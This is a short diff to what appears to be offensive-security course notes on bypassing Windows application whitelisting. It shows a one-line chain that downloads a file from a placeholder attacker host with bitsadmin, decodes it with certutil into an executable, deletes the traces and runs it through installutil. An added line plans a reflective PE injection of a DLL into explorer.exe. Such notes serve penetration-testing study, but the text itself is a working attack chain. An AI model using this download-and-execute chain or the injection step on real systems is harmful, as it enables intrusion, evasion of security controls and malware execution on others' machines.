@@ -70,3 +70,4 @@ Second trafer the file to target, decode and execute, and remove encoded file
 ```
 C:\Users\target>bitsadmin /Transfer myJob http://yourip/file.txt C:\users\target\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\target\Bypass.exe && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= LogToConsole=false /U C:\users\target\Bypass.exe
 ```
+Now we have a bypass method, we will update our Installer.cs to [InsallerShell.cs](/06ApplicationWhitelistingBypass/InstallerShell.cs) which use [Invoke-ReflectivePEInjection PowerShell](/03ProcessInjectionMigration/Invoke-ReflectivePEInjection.ps1) to inject a dll into explorer.exe
